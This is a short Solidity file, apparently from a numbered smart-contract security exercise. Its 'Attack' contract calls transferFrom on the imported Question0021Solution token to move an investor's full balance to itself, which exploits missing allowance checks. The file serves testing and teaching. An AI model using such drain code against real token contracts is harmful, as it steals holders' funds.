// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import './Question0021Solution.sol';
contract Attack {
    function attack(address _target, address _investor) public {
        Question0021Solution newCoin = Question0021Solution(_target);
        newCoin.transferFrom(
            _investor,
            address(this),
            newCoin.balanceOf(_investor)
        );
    }
}
